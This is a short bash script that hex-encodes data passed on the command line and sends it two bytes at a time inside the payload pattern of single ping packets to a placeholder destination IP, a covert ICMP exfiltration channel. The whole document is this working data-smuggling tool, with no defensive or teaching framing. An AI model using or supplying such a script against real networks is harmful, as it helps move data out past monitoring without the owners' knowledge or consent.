#!/bin/bash

if [ $# -eq 0 ]; then
  echo "Usage: $0 [data]"
  exit 1
fi

DATA=$1

# Split data into chunks of 2 bytes
CHUNKS=$(echo -n "$DATA" | xxd -p -c 2)

# Send each chunk in a separate ICMP packet
for c in $CHUNKS; do
  ping -c 1 -p "$c" [DESTINATION_IP] >/dev/null
done
